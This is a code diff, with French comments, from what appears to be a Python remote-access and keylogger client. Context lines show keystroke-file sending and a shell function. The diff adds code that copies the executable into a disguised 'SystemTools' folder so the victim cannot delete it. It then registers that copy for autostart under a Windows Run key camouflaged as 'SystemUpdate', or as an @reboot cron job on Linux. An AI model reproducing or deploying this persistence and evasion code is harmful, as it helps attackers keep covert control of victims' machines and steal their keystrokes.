@@ -114,34 +114,68 @@ def send_keystrokes_file():
         sending({"status": "success", "data": file_data})
     except Exception as e:
         sending({"status": "error", "message": str(e)})    
-    
-def add_persistence():
-    # Récupérer le chemin actuel de l'exécutable en cours d'exécution
-    script_path = sys.argv[0]  # Cela retourne le chemin de l'exécutable (client.exe)
 
+#la fonction qui vas duppliquer le client.exe dans un emplacemment sain pour eviter de supprimer par le vicitme        
+def duplicate_client(client_path):
     try:
         if platform.system() == "Windows":
-            # Ouvrir ou créer la clé de registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-            registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            app_name = "SystemUpdate"  # Nom visible dans le registre pour camoufler l'exécutable
-
-            # Vérifier si la persistance existe déjà
-            with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key_path, 0, reg.KEY_SET_VALUE) as reg_key:
-                reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, f'"{script_path}"')
-            
-            return f"Persistance ajoutée avec succès pour : {script_path}"
-        
+            # Chemin discret sous AppData\Roaming
+            hidden_folder = os.path.join(os.getenv('APPDATA'), "SystemTools")
         else:
-            # Ajouter une tâche cron pour Linux (si nécessaire)
-            cron_job = f"@reboot {script_path}\n"
-            cron_file_path = os.path.expanduser("~/.crontab")
-            with open(cron_file_path, "a") as cron_file:
-                cron_file.write(cron_job)
-            
-            return f"Persistance ajoutée avec succès pour : {script_path} dans la crontab"
+            # Chemin discret sous ~/.local/share
+            hidden_folder = os.path.join(os.path.expanduser("~/.local/share"), "SystemTools")
+
+        # Créer le dossier s'il n'existe pas
+        os.makedirs(hidden_folder, exist_ok=True)
+
+        # Chemin cible pour le fichier
+        target_path = os.path.join(hidden_folder, os.path.basename(client_path))
+        
+        # Copier le fichier s'il n'existe pas encore
+        if not os.path.exists(target_path):
+            with open(client_path, 'rb') as src, open(target_path, 'wb') as dst:
+                dst.write(src.read())
+            print(f"Client dupliqué dans : {target_path}")
+        else:
+            print(f"Le fichier existe déjà dans : {target_path}")
+        return target_path
+    except Exception as e:
+        print(f"Erreur lors de la duplication du fichier : {e}")
+        return None
+
+        
+    
+def add_persistence():
+    script_path = sys.argv[0]  # Chemin de l'exécutable en cours
+    try:
+        # Dupliquer le fichier dans un emplacement sûr
+        duplicated_path = duplicate_client(script_path)
+
+        if platform.system() == "Windows":
+            # Ajouter au registre Windows
+            registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            app_name = "SystemUpdate"  # Nom visible dans le registre
+
+            if duplicated_path:
+                with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key_path, 0, reg.KEY_SET_VALUE) as reg_key:
+                    reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, f'"{duplicated_path}"')
+                return f"Persistance ajoutée pour : {duplicated_path}"
+            else:
+                return "Erreur lors de la duplication pour la persistance."
+        else:
+            # Ajouter une tâche cron sous Linux
+            if duplicated_path:
+                cron_job = f"@reboot {duplicated_path}\n"
+                cron_file_path = os.path.expanduser("~/.crontab")
+                with open(cron_file_path, "a") as cron_file:
+                    cron_file.write(cron_job)
+                return f"Persistance ajoutée pour : {duplicated_path} dans la crontab"
+            else:
+                return "Erreur lors de la duplication pour la persistance."
 
     except Exception as e:
         return f"Erreur lors de la configuration de la persistance : {str(e)}"
+
 
         
 def shell():
